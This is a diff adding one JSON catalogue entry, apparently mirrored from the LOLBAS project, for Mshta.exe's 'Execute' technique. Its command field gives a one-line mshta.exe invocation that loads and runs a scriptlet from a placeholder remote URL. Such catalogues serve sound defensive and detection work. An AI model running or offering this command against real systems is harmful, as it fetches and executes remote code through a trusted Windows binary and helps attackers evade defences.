@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-mshta-exe-execute-3",
+  "name": "LOLBAS · Mshta.exe (Execute) #3",
+  "command": "mshta.exe javascript:a=GetObject(\"script:{REMOTEURL:.sct}\").Exec();close();",
+  "description": "Executes JavaScript supplied as a command line argument.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "mshta",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Mshta/",
+  "upstream_id": "Mshta.exe/Execute/2",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — Mshta.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Mshta/"
+    }
+  ]
+}
